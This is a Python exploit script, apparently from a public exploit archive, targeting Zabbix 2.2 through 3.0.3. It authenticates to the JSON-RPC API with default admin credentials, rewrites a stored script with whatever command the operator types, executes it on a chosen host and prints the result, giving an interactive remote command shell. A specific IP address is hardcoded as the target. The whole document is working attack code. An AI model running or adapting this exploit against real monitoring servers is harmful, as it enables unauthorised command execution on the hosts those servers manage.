#!/usr/bin/env python
# -*- coding: utf-8 -*-
# https://packetstormsecurity.com/files/137454/Zabbix-3.0.3-Remote-Command-Execution.html
# Exploit Title: Zabbix RCE with API JSON-RPC
# Date: 06-06-2016
# Exploit Author: Alexander Gurin
# Vendor Homepage: http://www.zabbix.com
# Software Link: http://www.zabbix.com/download.php
# Version: 2.2 - 3.0.3
# Tested on: Linux (Debian, CentOS)
# CVE : N/A

import requests
import json
import readline

ZABIX_ROOT = 'http://191.7.49.68'  ### Zabbix IP-address
url = ZABIX_ROOT + '/api_jsonrpc.php'   ### Don't edit

login = 'admin'     ### Zabbix login
password = 'zabbix' ### Zabbix password
hostid = '10084'    ### Zabbix hostid

### auth
payload = {
    "jsonrpc" : "2.0",
    "method" : "user.login",
    "params": {
        'user': ""+login+"",
        'password': ""+password+"",
    },
    "auth" : None,
    "id" : 0,
}
headers = {
    'content-type': 'application/json',
}

auth  = requests.post(url, data=json.dumps(payload), headers=(headers))
auth = auth.json()

while True:
    cmd = raw_input('\033[41m[zabbix_cmd]>>: \033[0m ')
    if cmd == "" : print "Result of last command:"
    if cmd == "quit" : break

### update
    payload = {
        "jsonrpc": "2.0",
        "method": "script.update",
        "params": {
            "scriptid": "1",
            "command": ""+cmd+""
        },
        "auth" : auth['result'],
        "id" : 0,
    }

    cmd_upd = requests.post(url, data=json.dumps(payload), headers=(headers))

### execute
    payload = {
        "jsonrpc": "2.0",
        "method": "script.execute",
        "params": {
            "scriptid": "1",
            "hostid": ""+hostid+""
        },
        "auth" : auth['result'],
        "id" : 0,
    }

    cmd_exe = requests.post(url, data=json.dumps(payload), headers=(headers))
    cmd_exe = cmd_exe.json()
    print cmd_exe["result"]["value"]
